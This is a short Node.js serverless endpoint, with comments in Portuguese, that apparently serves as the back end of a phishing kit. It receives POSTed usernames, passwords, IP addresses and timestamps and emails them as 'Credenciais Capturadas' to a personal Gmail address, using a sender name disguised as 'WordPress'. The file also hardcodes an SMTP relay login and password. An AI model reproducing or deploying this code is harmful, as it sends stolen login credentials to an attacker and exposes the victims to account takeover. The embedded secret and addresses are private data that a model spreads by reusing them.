// api/log.js
const nodemailer = require('nodemailer');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        const data = req.body;
        console.log('📧 DADOS RECEBIDOS:', data);

        // ENVIAR EMAIL
        await enviarEmail(data);
        
        res.status(200).json({ success: true });
        
    } catch (error) {
        console.error('❌ ERRO:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
}

async function enviarEmail(data) {
    const transporter = nodemailer.createTransport({
        host: 'smtp-relay.brevo.com',
        port: 587,
        secure: false,
        auth: {
            user: 'survivortheweb@gmail.com',
            pass: '3NkLXZIGpS6aBnVj'
        }
    });

    const mailOptions = {
        from: '"WordPress" <survivortheweb@gmail.com>',
        to: 'ofelipeoliveira.rodrigues@gmail.com',
        subject: '🔐 Credenciais - ' + data.username,
        html: `
            <h3>Credenciais Capturadas</h3>
            <p><strong>Usuário:</strong> ${data.username}</p>
            <p><strong>Senha:</strong> ${data.password}</p>
            <p><strong>IP:</strong> ${data.ip}</p>
            <p><strong>Data:</strong> ${data.timestamp}</p>
        `
    };

    await transporter.sendMail(mailOptions);
}